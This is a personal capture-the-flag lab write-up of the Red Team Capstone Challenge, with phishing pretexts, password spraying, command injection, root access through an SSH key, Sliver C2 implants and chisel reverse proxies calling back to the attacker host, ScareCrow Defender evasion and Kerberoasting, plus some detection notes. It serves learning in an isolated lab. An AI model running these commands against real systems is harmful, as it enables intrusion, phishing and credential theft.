# Red-Team-Capstone-Challenge Helped-Through

Name: Red Team Capstone Challenge 
Date:  
Difficulty:  Hard
Goals:  
- Red Teaming with the any Community 
	- Subbed to 0xTiberious
	- Joined the Work Harder Group
- Get as many feasible perspectives and tricks
- Watch the speed run 
- Get the badge!
Learnt:
- Limitations and pitfall of Wordlist generators 
- Wordlist generator alternative tools
- Setup Local Email for Red Reasons
- AlH4zr3d's Phishing and Spearphishing SE leafy-bug strategy 
- `fping` is better than `ping`
- Sliver is awesome



![](october.png)

- [[Red-Team-Capstone-Challenge-Notes.md]]
- [[Red-Team-Capstone-Challenge-CMD-by-CMDs.md]]
- [[Red-Team-Capstone-Challenge-Credentials]]

General disclaimer, this is more a documentation of my following along with Streamer and other where could. I am here to learn and have no really possibility of getting this done solo without a lot of time off work and more capabilities. I am hope to earn and learn some here. 

#### Content Creators I watched during this...

- [Tib3rius - Youtube](https://www.youtube.com/@Tib3rius) / []
- [alh4zr3d3 - Youtube](https://www.youtube.com/@alh4zr3d3) / [alh4zr3d3 - Twitch](https://www.twitch.tv/videos/1817405607)
- [TylerRamsbey](https://www.youtube.com/@TylerRamsbey)
	- Full playlist:  https://www.youtube.com/watch?v=xrh3g5VjY6Y&list=PLMoaZm9nyKaOrmj6SQH2b8lP6VN7Z4OD-


#### My Map

![](Red-Team-Capstone-Challenge-map.excalidraw.md)

Firstly connecting to have a pretend domain squated email.
![](cooltext.png)


## OSINT  

Alh4zr3d inital steps while enumerating in the background begin with crackmapexec.
```
crackmapexec <proto> 10.200.121.0/24 -u '' -p ''
```

![](cme-init.png)

![](webroot.png)
- Aimee Walker & Patrick Edwards.

Harvesting usernames http://10.200.121.13/october/index.php/demo/meettheteam -> linked to http://10.200.121.13/october/themes/demo/assets/images/ 
```bash
curl http://10.200.121.13/october/themes/demo/assets/images/ -o images
cat images| cut -d '"' -f 8 | grep '.jpeg' | sed 's/.jpeg//g' > users.txt
echo "aimee.walker" >> users.txt
echo "patrick.edwards" >> users.txt
```

I tried injection techniques against the To Do Lists
![](sendacvtothereserve.png)

Learnt how to configure Thunderbird and a brian nugde  of how DNS is part of resolving MX record - @0xTib3rius 
![](thunderbirdconfig.png)

Our first email
![](ourfirstemail.png)

Inital innocuous email - Alh4zr3d went for targeting Lynda because here physical and privileged access to the C-Suite. We change outgoing server
![](changedoutgoingserver.png)
My email sent - remvoed brenda, leslie and martin as they broke the sending process:
![](innocuous-email-one.png)

Al gets Charlene almost instantly. It is possible that got filtered due words I have used.
![](iaminneedofagoodbank.png)

![](charleneresponds.png)

Try to push the mental buttons of panic on the pretend email scripts.
![](tryingthepanicbuttons.png)

[Business Unit](https://en.wikipedia.org/wiki/Strategic_business_unit)
![](businessunit.png)

Alh4zr3d wants to pick a domain to impersonate, but typo-squating is not as affective as email services  will alert the user to if the email is an external email.

Pretext
1. Reason to reach out to a person
2. Reason that the target is expecting to recieve emails

![](bopscrkused.png)

A funny stream moment I missed because of sleep.
![](wouldhavebeenfunlive.png)

More recon and trying out password generators later
```bash
# 
gobuster vhost -u http://thereserve.loc -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain -o vhosts.gb
#
gobuster dir -u http://mail.thereserve.loc -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt  mail-dirs-raftsmallwords.gb
# $WORD from password_base_list
mp32 --custom-charset1='!@#$%^' $WORD?d?1 >> mp32-passwd.lst
# Hydra the SMTP server
hydra -L lists/emails.txt -P mp32-passwd.lst mail.thereserve.loc smtp
```

Then credentials 
![](hydrathepasswords1.png)

[[Red-Team-Capstone-Challenge-Credentials]]

Inspired by response time talking point about burpsuite pro - Poor Man's Reponse Curlculator
```bash
#!/bin/bash

if [ "$#" -ne 0 ]; then
        echo "Usage: $0 no arguments required as you are required to paste in full curl commands"
        exit
fi

echo "Inital full curl command is required"
echo ""
read -p 'Paste in your first full payload now: ' CURL1
echo ""
echo "Second full curl command is required..."
echo ""
read -p 'Paste in your first full payload now: ' CURL2

TIME0=$(date +"%T.%N")
echo "Sending first curl to $CURL1"
$CURL1
wait
TIME1=$(date +"%T.%N")
echo ""
sleep 3
TIME2=$(date +"%T.%N")
echo "Sending first curl to $CURL1"
$CURL2
wait
TIME3=$(date +"%T.%N")
echo ""
echo ""
echo ""
echo ""
echo "First curl started at: $TIME0"
echo "First curl ended at: $TIME1"
echo "Second curl started at: $TIME2"
echo "Second curl ended at: $TIME3"
exit
```

Just as I was catching up on the progress made by at [Tyler](https://www.youtube.com/watch?v=xrh3g5VjY6Y&t=5277s) this point he discovers a VPN key. Unlike Al or Tibs who went with a target approach - Web server and Email server plus password spray. Tyler went for a similiar approach to I originally set out with holistic scan and enumerate anything and everything and list out threads of where to pull of the next stages of the overall engagement.

I guess corperation just like leaving free vpn keys lying around on the vpn gateway..
![1080](thefaceofamanwhohasfoundvpnfreetouse.png)

Without having paid much attention just verifying steps made. 
![1080](vpnkeydirectory.png)

This could also indicate a naming convention for vpn key that we may steal from the employees to by able to securely pivot through the later firewalls. Remember to always read and fix where required
![](remembertofix.png)
And fixing it we get a legitmate way in. 
![](corpUserinterface.png)

Quick test to figure out username format. 
![](usernameformattingdeduction.png)

Given that Tyler does know what `-e` flag for nmap does and I also want to be more red team given there are firewalls and EDRs and all that. Using nmap could be a bad idea. To solve this I checked if `-sS`  would show up as nmap packet that can be parsed as such
![](doublechecksshasnonmap.png)

While I was being to overthink the addressing part
![](vpninternalnetworksexplained.png)
It is just in the vpn output. 

```bash
sudo nmap -Pn -sS -p 21,22,23,53,80,88,110,135,137,138,139,143,389,443,445,464,636,3306,3389,5000,9389 -e tun0 172.32.5.21/32

sudo nmap -Pn -sS -p 21,22,23,53,80,88,110,135,137,138,139,143,389,443,445,464,636,3306,3389,5000,9389 -e tun0 172.32.5.22/32
# The alternative would be to try resolve over netbios 
# 
sudo nmap -Pn -sS -p 21,22,23,53,80,88,110,135,137,138,139,143,389,443,445,464,636,3306,3389,5000 --min-rate 200 -e tun0 12.100.1.0/24 -v

sudo nmap -Pn -sS -p 21,22,23,53,80,88,110,135,137,138,139,143,389,443,445,464,636,3306,3389,5000 --min-rate 200 -e tun0 # -v


```

A temporary wordlist to the wordlist problem of problems solution for < 38K words. 
```bash
cat /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt && cat /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt #&& cat /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt |  sort -u > betterRaftandDirb.txt
```

There is a vpns directory to fuzz. If we have a username format we can fuzz it. I forgot to reset the network and then the vpn key.

Alh4zr3d goes full sliver and re-introduces me to the wonder of [ScareCrow](https://github.com/optiv/ScareCrow) - need to play with this 

- https://github.com/BishopFox/sliver/wiki/Pivots
- https://dominicbreuker.com/post/learning_sliver_c2_10_sideload/

Tyler references [Orange-Cyberdefense Mindmaps](https://github.com/Orange-Cyberdefense/ocd-mindmaps/blob/main/img/pentest_ad_dark_2023_02.svg), which is a extensive mindmap of AD attacks.

At this point after watching [Alh4zr3d live](https://www.twitch.tv/videos/1823317510) I decided to approach this by preparing to be able to bypass EDR, AV first before continuing with The VPN route. I want to follow both methods and check Tib3rious's way in before getting the second domain controller. As objective go the main problem is that I neither have to time or experience over the coming weeks to dedicate to bypassing EDR for the first time without some tried a true way. I acknowledge the hand-holding to success with dedicating a significant amount of write and research work for my Archive Project to learn as much from others sturggles. To save myself time in the future struggle of HTB ProLabs that I will hopeful do next year. Guessing that Tyler will probably gain a foothold I started by considering my options before going through other paths with [Part 2 of Tyler RTCC video](https://www.youtube.com/watch?v=TUyYUSr0O_Y). [am03bam4n](https://tryhackme.com/p/am03bam4n) was present on this stream and explained that the VPN instability is reflective of the real world - what I took from this is that actually we need away from using the corpusername.ovpn as soon as possible. 

`fping` is better than `ping`
```bash
# show alive target, provide stats, generating a list as -f not provided - with quiet - no per-target/ping results
fping -asgq
```

Best time to do this in the real world is to do this first thing in the morning local to the on-premise office.
```bash
sudo responder -I tun0
```

Network Manage CLI tool
```bash
nmcli 
```

Tyler went deep into the web application:
![](wehaveuserenum.png)

Password Mangling - instead of the extensive ChatGPT usage I went for search engines - https://github.com/NotSoSecure/password_cracking_rules.git, because although AI is great as a service it is not is commonly wrong, but the tone of authority and some of the syntax used is both irratating and also really dangerous. It is very sure it is correct that it search the internet better that you. Also it is slow and filtering for "safety". And to top it off there are better open source version that I need to look into before all the sad tech companies failing to hit profit try to restrict the entire market and eco-system to save themselves not everyone else. Continuing on with [Part 3 with Tyler](https://www.youtube.com/watch?v=svdhIyifHC8) and [Finishing the AV evasion stream for the knowledge](https://www.twitch.tv/videos/1823317510)...but Al had a rough time and I 

```bash
# Download the OneRuleToRuleThemAll
curl -L https://raw.githubusercontent.com/NotSoSecure/password_cracking_rules/master/OneRuleToRuleThemAll.rule -o OneRuleToRuleThemAll.rule  
# Remove the case insensitive duplicates to save 300k  
cat password_base_list.txt | uniq -i > better_base_password_list.txt
# Create a wordlist with hashcat to improve my cheatsheets 
hashcat --force better_base_password_list.txt -r ../OneRuleToRuleThemAll.rule --stdout > Bpbl-ORTRTA.txt
# Reduce by another 10k word for 309K words
cat Bpbl-ORTRTA.txt | uniq > Bpbl-ORTRTA.txt
```

laura.wood@thereserve.loc : Password1@ for the [[Red-Team-Capstone-Challenge-Credentials]], but I already have that from a previous attempt, but ... it is 240574 in the smaller OneRuleToRuleThemAll list, so this better for password cracking than spraying. A win for `mp32 --custom-charset1='!@#$%^' $WORD?d?1 >> mp32-passwd.lst`
![](laurais240574.png)

[37:54](https://www.youtube.com/watch?v=svdhIyifHC8) - My VPN or the server is already patched behind someone already ahead of me.

Press submit for free VPN keys
![](laurawoodvpnlogin.png)

WE ARE MOHAMMAD - rdp access finally!!!
![](wearemohammad.png)

![](wehaveping.png)
Then the machine shutdown.

## Perimeter Breach

Then al finds cmd injection
![](alhappywecansleeptheserver.png)

My suspicions of the multitude of hole in the bank to poke at are many
![1080](alfindcmdi.png)

Password in DB connect
![](dbconnect.png)

vpn : password1!

![](sudolvpnserver.png)

![](lisamorepass.png)

lisa.moore : Scientist2006

[gtfobins cp](https://gtfobins.github.io/gtfobins/cp/#sudo)
```
LFILE=file_to_write
echo "DATA" | sudo cp /dev/stdin "$LFILE"
```

Al wants to pivot, but then wants to overwrite ssh. Sshimple is better
```bash
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC/zc3tx/DGZGDr7KWUlAzH5stPT7oySNhZqe+1snxmByRA7kiIIp8tly12x7vxFCvwhf7R7Sp1qR0Pzi5S5uAGO//+YD4ukVDtzA0F0oi2KjWsGZB5I0HUp7QERY8nb9yL3rfTC6HIMF0cCBUU0zNkVnCSYeZDG7WePSp7lblIOBmHd54a+3UAaShQc8Fadk0IQchW8MAvRcyQM7J0F2fT/aPTmUbv77VrUWFapgwuUBydXZA9eu+YOn9y1g5ID3QL6UpVHjNAjXPw1byRiyMRPUZcCL9No5fNa7Lu3e6xqB7qvgT20CQuohkpckWBroFoitG/K0VVsFFwQWaXvZGLwKJtvBwscDVIcFdoqfUO9JNNZ9G0Q97t1CZTuT9vRLvlRyOp1gir/iE45hCzchmpz8SM4RvGo8gvpnKWy8//noDas6nXqRxwvAEKe2S4nbSFBD5Xt7gTOH1gukutcN0TDQ+Iw0tYNXpHnIgKzhx/CseyPd+1KPhbTtq5T44W9yc=" > authorized_keys
sudo cp authorized_keys /root/.ssh/authorized_keys
```

![](cpintoroot.png)

Went on a bit of tangent with how Proxychains works; SSH tunnel - but we are on a multi-hacker network so everyone using ssh is a really danger.

```bash
cat vpn-interal-thm-free-packed-lunch-in-the-lands.nmap | grep 'scan report' | awk '{print $6}' | tr -d '()' > ~/RedTeamCapStoneChallenge/internalHosts.txt
# Local network information
route
arp -a
```

![](vpnarpcache.png)

Persistence just in case of other people using the same vectors
```go
// For VPN
generate --mtls 10.50.116.126:11011 --arch amd64 --os linux --save /home/kali/RedTeamCapStoneChallenge/Tools/VPN-upgrade
generate beacon --mtls 10.50.116.126:11012 --arch amd64 --os linux --save /home/kali/RedTeamCapStoneChallenge/Tools/VPN-update
mtls -L 10.50.116.126 -l 11011
mtls -L 10.50.116.126 -l 11012
// Drop on VPN
nohup ./VPN-update &
nohup ./VPN-upgrade &
```

Setup up chisel server to handle a Dynamic Reverse Proxy 
```bash
./chisel server -host 10.50.116.126 -p 20000 --reverse --socks5 -v
# On the VPN
nohup ./chisel client 10.50.116.126:20000  R:20001:socks &
# comment sock4 ... and add to /etc/proxychains4.conf:
socks5  127.0.0.1 20001
```

Proxychains and chisel proof
![](proxychainandchiselsetupcomplete.png)

lisa.moore credentials have been 
![](passwordchangeon103.png)

Crackmap Exec

Certipy - 101 with Al
```bash
proxychains certipy-ad find -u 'lisa.moore' -p 'Scientist2006' -dc-ip 10.200.119.102
```

Web Enrollment is web-based builtin interface to enrollment, which uses ntlm authentication.

Web Enrollment : Disabled - not real life, NTLM relay attack if we could
Look at Enrollment Rights

If we have get SYSTEM access on Server 1 then we DC because of the Enrollment rights.

add CORPDC, Server1 to /etc/hosts

Shakestech recommends [https://github.com/iphelix/dnschef](https://github.com/iphelix/dnschef)

Bloodhound run with `--dns-tcp` uses dns over tcp which works better over `proxychains`, but this did not work for Al. 
```go
generate beacon --mtls 10.50.116.126:11013 -b --arch amd64 --os windows -f shellcode -G --save /home/kali/RedTeamCapStoneChallenge/Tools/Server01.bin
// ScareCrow to bypass Windows Defender - shoot fly with bozaka
./ScareCrow -I /home/kali/RedTeamCapStoneChallenge/Tools/Server01.bin -Loader binary -domain google.com
// Deploy implant

// Run .NET assembly in its own process - without a beacon object file!
execute-assembley -i 
```


Download with `Google Chrome` from RDP session

Covenant is .Net framework meaning that if we unhook AMSI Windows Defender is bypassed from then on

SharpHound.ps1 works

Crying out the credential changing, Tiberious struggles till he get `admin : password1!`
![](tibsisinontheweb.png)


## Initial Compromise of Active Directory


```bash
proxychains4 python3 /opt/BloodHound.py/bloodhound.py --dns-tcp -c all -d corp.thereserve.loc -ns 10.200.119.102 -u 'lisa.moore' -p 'Scientist2006'
```

I added 2[[RTCC-BH-Notes-Corp]] - and then kerberoasted the dc

```bash
proxychains4 impacket-GetUserSPNs -dc-ip 10.200.119.102 -request 'corp.thereserve.loc/laura.wood'
```

![](kerberoastagasm.png)


![](bigbypass.png)

- Procdump did not work (or more likely my brain), but did not get detected. I decide to go for armory tools to escalate first rather than trying to dump lsass, presume that either previous compromises would have left artefacts and 

[Thanks to Cyber attack & defense](https://www.youtube.com/watch?v=izMMmOaLn9g) , 
```go
// Display help
help <command>

// For multi-client
multiplayer 
new-operator
// Connect with Client

// With Administrative and adble to get SeDebugPrivilege - by default uses spool.svc to getsystem 
getsystem

// psexec is embedded into sliver good for lateral movement
psexec --profile BEACON <hostname>

// Beacons
// Drop down to select with arrow keys
use 
// Create an interactive sessions
interactive
execute -o <command>


session -i $id

// Shell
// Exit shell, be patient wait 30 seconds
exit
```

Sliver beacon detection:
```powershell 
# Requires Sysmon2
# look for default nomanclature, but this is easily customised -save /path/name.exe
WORD_WORD.exe 

powershell.exe -NoExit -Command[Console]::OutputEncoding=[Text:UTF8Encoding]:UTF8
# by default uses spool.svc to getsystem 
spool.svc
```

`Cyberchef` -> `Regular Expresssion -> Regex: Sliver`  then upload file that you suspect is a Sliver binary. Make sure you set the recipe first or you will crash your browser.

```json
// Language MUST BE: lucene
event.code:8 AND winlog.event_data.TargetImage:(*spoolsv*) AND winlog.event_data.TargetUser:(*
NT* AND *AUTHORITY\\SYSTEM*)
```

reg query the WDIGEST
```go
execute -o reg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential
```


```go
interactive
sessions -i <id>
sharpup audit
execute -o icacls "c:\Backup Service"
```

We have full control of the backup service 
![](backupyourpathboyoswearepathhijackrinoingthewrk1.png)

```go
execute -o sc query state= all
// COPY and PASTE stop :set paste in vim sometimes...
xsel -b > WRK1-sc-qc.output 
```

![](foundthebackupservice.png)

Sadly I got 193 error meaning that I could perform the path hijack and the serviceName service outputs error 5 meaning I need administrator


[seatbelt commmands](https://github.com/GhostPack/Seatbelt)

```go
// 
seatbelt -h 
seatbelt UAC // need admin
seatbelt LAPS // LAPS not enabled
seatbelt Services 
// And serviceName is admininstrator
seatbelt Autoruns
//   HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run :
//  C:\Windows\system32\SecurityHealthSystray.exe
seatbelt WindowsVault // 0
seatbelt WindowsDefender // No exclusions
seatbelt WindowsAutoLogon // Autologons
seatbelt ScheduledTasks // None that run outside of System32
seatbelt powershell // We can downgrade to bypass AMSI
```

#### Just checking
![](wrk1system32icacls.png)

#### What we can do

-  We can downgrade to bypass AMSI
![](wrk1powershelldowngradeasap.png)

#### What we could consider

-  Mimikatz no laps all bypassing WinDefend still required
	- `seatbelt DpapiMasterKeys` - use `sekurla:dpapi` module
- Python311

#### Seatbelt required: the Hound brings back the biscuits

At this point I went over my Bloodhound information, then kerberoasted svc accounts.

[Hashcat 13100](https://hashcat.net/wiki/doku.php?id=example_hashes) or krb5tgs with john
```
sudo apt install ntpdate
sudo ntpdate $dc_ip

john hash --format=krb5tgs   /usr/share/wordlists/rockyou.txt
- Password1!
```


## Full Compromise of CORP Domain


## Full Compromise of Parent Domain
## Full Compromise of BANK Domain
## Compromise of SWIFT and Payment Transfer
